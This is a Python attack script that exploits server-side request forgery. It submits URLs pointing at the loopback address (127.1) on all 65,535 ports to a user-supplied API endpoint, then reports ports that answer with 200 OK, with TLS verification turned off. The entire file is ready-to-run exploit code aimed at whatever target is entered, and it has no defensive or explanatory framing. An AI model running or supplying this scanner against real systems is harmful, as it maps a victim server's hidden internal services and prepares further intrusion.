import requests
import urllib3

# Suppress insecure request warnings (-k equivalent)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Ask the user to enter their own API endpoint
api_url = input("Enter the target API endpoint (e.g., https://<site>/route/endpoint): ").strip()

headers = {"Content-Type": "application/json"}

# Define the port range to scan
start_port = 1
end_port = 65535

print(f"\n[*] Starting port scan using endpoint: {api_url}")
print(f"[*] Scanning ports {start_port} to {end_port}...\n")

for port in range(start_port, end_port + 1):
  target_url = f"http://127.1:{port}/"
  payload = {"url": target_url, "format": "csv"}

  try:
    response = requests.post(
        api_url, json=payload, headers=headers, verify=False, timeout=5
    )

    # Output successful or interesting responses
    if response.status_code == 200:
      print(f"[+] Port {port} responded (200 OK): {response.text[:100]}")
    
  except requests.exceptions.RequestException as e:
    # Handles timeouts or connection errors gracefully
    pass
